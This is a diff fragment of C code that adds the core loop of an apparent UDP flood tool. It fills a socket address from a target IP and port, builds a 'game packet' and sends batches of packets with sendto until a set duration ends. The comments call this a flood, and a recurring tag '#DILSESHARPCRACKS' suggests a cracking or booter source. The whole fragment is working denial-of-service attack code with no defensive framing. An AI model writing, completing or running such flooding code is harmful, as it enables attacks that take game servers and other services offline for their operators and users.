@@ -1,0 +1,27 @@
+ // Set up target address information#DILSESHARPCRACKS 
+    memset(&target, 0, sizeof(target));
+    target.sin_family = AF_INET;
+    target.sin_port = htons(data->port);
+    inet_pton(AF_INET, data->ip, &target.sin_addr);
+
+    // Generate the packet content outside the loop
+    create_game_packet(buffer, BUFFER_SIZE);
+
+    // Get the time when the flood should stop
+    struct timeval start_time, current_time;
+    gettimeofday(&start_time, NULL);
+    time_t end_time = start_time.tv_sec + data->duration;
+
+    // Loop until the duration expires#DILSESHARPCRACKS 
+    while (1) {
+        gettimeofday(&current_time, NULL);
+        if (current_time.tv_sec >= end_time) break;
+
+        // Send a batch of packets to reduce system call overhead
+        for (int i = 0; i < BATCH_SEND; i++) {
+            if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
+                perror("sendto failed");
+                break;
+            }
+        }
+    } #DILSESHARPCRACKS 
